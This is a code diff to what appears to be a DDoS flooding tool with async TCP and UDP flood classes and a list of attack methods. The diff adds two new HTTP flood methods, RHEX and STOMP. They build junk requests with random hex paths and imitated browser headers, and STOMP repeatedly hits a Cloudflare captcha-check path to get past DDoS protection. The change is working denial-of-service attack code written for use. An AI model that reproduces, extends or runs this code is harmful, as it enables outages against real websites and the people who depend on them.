@@ -49,7 +49,7 @@ class Methods:
     HTTP_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "AVB",
-        "APACHE", "XMLRPC", "DOWNLOADER"
+        "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP"
     }
     TCP_METHODS: Set[str] = {"TCP"}
     UDP_METHODS: Set[str] = {
@@ -170,10 +170,6 @@ class AsyncTcpFlood:
         self._addr = addr
         self._raw_target = (self._addr, (self._target.port or 80))
         self._stats = stats
-
-        if not self._target.host[len(self._target.host) - 1].isdigit():
-            self._raw_target = (self._addr, (self._target.port or 80))
-
         self._proxies = proxies
         self._req_type = (
             "POST" if method.upper() in {"POST", "XMLRPC", "STRESS"}
@@ -208,13 +204,13 @@ class AsyncTcpFlood:
             self.spoof_ip()
         )
 
-    def default_headers(self):
+    def default_headers(self) -> str:
         return (
             self.random_headers() +
             f"Host: {self._target.authority}\r\n"
         )
 
-    def default_path_qs(self):
+    def default_path_qs(self) -> str:
         path_qs = self._target.raw_path_qs
         if self._target.raw_query_string:
             path_qs += '&%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
@@ -222,7 +218,7 @@ class AsyncTcpFlood:
             path_qs += '?%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
         return path_qs
 
-    def build_request(self, path_qs=None, headers=None, body=None):
+    def build_request(self, path_qs=None, headers=None, body=None) -> bytes:
         path_qs = path_qs or self.default_path_qs()
         headers = headers or self.default_headers()
         request = (
@@ -528,6 +524,71 @@ class AsyncTcpFlood:
             partial(randbytes, packet_size),
             on_connect
         )
+
+    async def RHEX(self, on_connect=None) -> bool:
+        # XXX: not sure if this is gonna be a proper "hex". maybe we need
+        #      to do a hex here instead of just wrapping into str
+        randhex: str = str(randbytes(random.choice([32, 64, 128])))
+        packet: bytes = str.encode(
+            f"{self._req_type} {self._target.authority}/{randhex} HTTP/1.1\r\n"
+            f"Host: {self._target.authority}/{randhex}\r\n"
+            f"{self.random_headers()}"
+            'Accept-Encoding: gzip, deflate, br\r\n'
+            'Accept-Language: en-US,en;q=0.9\r\n'
+            'Cache-Control: max-age=0\r\n'
+            'Connection: keep-alive\r\n'
+            'Sec-Fetch-Dest: document\r\n'
+            'Sec-Fetch-Mode: navigate\r\n'
+            'Sec-Fetch-Site: none\r\n'
+            'Sec-Fetch-User: ?1\r\n'
+            'Sec-Gpc: 1\r\n'
+            'Pragma: no-cache\r\n'
+            'Upgrade-Insecure-Requests: 1\r\n\r\n'
+        )
+
+        return await self._generic_flood_proto(FloodSpecType.BYTES, packet, on_connect)
+
+    async def STOMP(self, on_connect=None) -> bool:
+        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
+               'Accept-Language: en-US,en;q=0.9\r\n'
+               'Cache-Control: max-age=0\r\n'
+               'Connection: keep-alive\r\n'
+               'Sec-Fetch-Dest: document\r\n'
+               'Sec-Fetch-Mode: navigate\r\n'
+               'Sec-Fetch-Site: none\r\n'
+               'Sec-Fetch-User: ?1\r\n'
+               'Sec-Gpc: 1\r\n'
+               'Pragma: no-cache\r\n'
+               'Upgrade-Insecure-Requests: 1\r\n\r\n')
+        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
+               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
+               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
+               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
+               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
+               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
+               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
+               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
+               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
+               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
+               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
+        p1: bytes = str.encode(
+            f"{self._req_type} {self._target.authority}/{hexh} HTTP/1.1\r\n"
+            f"Host: {self._target.authority}/{hexh}\r\n"
+            f"{self.random_headers()}{dep}"
+        )
+        p2: bytes = str.encode(
+            f"{self._req_type} {self._target.authority}/cdn-cgi/l/chk_captcha HTTP/1.1\r\n"
+            f"Host: {hexh}\r\n"
+            f"{self.random_headers()}{dep}"
+        )
+        p1_size, p2_size = len(p1), len(p2)
+
+        def _gen():
+            yield FloodOp.WRITE, (p1, p1_size)
+            for _ in range(self._settings.requests_per_connection):
+                yield FloodOp.WRITE, (p2, p2_size)
+
+        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
 
 class AsyncUdpFlood:
